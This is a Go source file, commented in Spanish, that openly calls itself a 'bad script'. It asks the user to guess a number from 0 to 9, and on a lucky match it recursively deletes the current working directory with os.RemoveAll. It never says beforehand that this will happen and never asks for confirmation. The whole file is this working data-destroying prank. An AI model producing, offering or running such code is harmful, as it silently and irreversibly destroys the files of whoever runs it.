package main

import (
	"fmt"
	"os"
	"math/rand"
	"time"
)

func main(){
	// Semilla del número random
	rand.Seed(time.Now().UnixNano())
	num := rand.Intn(10)


	fmt.Println("Script malo >:)")
	fmt.Print("Dame un número entre 0-9: ")
	var unum = 0

	_, err := fmt.Scanln(&unum)
	if err != nil {
		fmt.Println("Número invalido")
		return
	}

	if unum == num {
		fmt.Println("Mala suerte! dile adios a este directorio muajajaja")
		dir, err := os.Getwd()

		if err != nil {
			fmt.Println("Oh no, esta vez tuviste suerte, hubo un error")
		}

		err = os.RemoveAll(dir)
		if err != nil {
			fmt.Println("Oh no, esta vez tuviste suerte, hubo un error")
		}
	} else {
		fmt.Println("¿Suerte? ...")
	}
}
